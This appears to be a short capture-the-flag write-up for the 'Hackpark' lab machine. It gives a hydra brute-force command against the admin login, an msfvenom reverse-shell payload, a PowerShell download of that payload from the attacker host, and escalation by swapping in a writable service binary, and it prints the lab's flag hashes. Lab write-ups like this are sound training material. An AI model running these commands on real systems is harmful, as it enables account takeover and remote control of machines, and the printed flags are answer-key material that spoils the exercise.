# Hackpark 

> VOiD | Thursday 05 August 2021 11:55:51 AM IST

My IP : 10.17.6.109
Target IP : 10.10.6.123

# PORT 80

/robots.txt
```bash
User-agent: *
Disallow: /Account/*.*
Disallow: /search
Disallow: /search.aspx
Disallow: /error404.aspx
Disallow: /archive
Disallow: /archive.aspx

#Remove the '#' character below and replace example.com with your own website address.
#sitemap: http://example.com/sitemap.axd 
# WebMatrix 1.0

```

/admin
lets bruteforce
```bash

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.1.28  http-form-post "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=IWseCordoozIP%2Fl5l%2Fvg5cmOzWc6PYL5Avr31ovP5a5OT6197vNUK%2BrwlgpaNOJ3gdYLEJBabWWpnz%2FVTc1u0Gruy6J8YlfZu%2FlAdDkJeIbxwaFfAe8oZD5pMaXgmhxzivylPfoZ91hZjAEePTk0bYCeF4tOTfx3IUOU2vUx6ustlIlj&__EVENTVALIDATION=Gy99XB6ostuXenNeKLluLcE%2BKlnhXc%2BGsnFWzSjgB85mrbFdZM%2FFESQE%2B2oe2kuhKMJH9dOoiV9ytAuRTCLOnkHRLPHcI0IWNlJ%2BjBGFa73LoOCtzaRZEo2ptsMa%2B62Dw6RKXuOfa0kH2bbdYZlsnL2Eg0oXE6MrqBUk3NcUUnH7CgYt&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V -t 30

```

# Fronthold
```bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.109 LPORT=8888 --platform windows -f exe -o shell.exe

Users\Public\Downloads>powershell -c "Invoke-WebRequest -Uri 'http://10.17.6.109:8080/shell.exe' -Outfile c:\Users\Public\Downloads\shell.exe"

.\shell.exe




    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper

read the logs and we find that there is a message binary Running we change it with our shell.exe and wait till it calls back

cat user.txt 
759bd8af507517bcfaede78a21a73e39

cat root.txt 
7e13d97f05f7ceb9881a3eb3d78d3e72


```
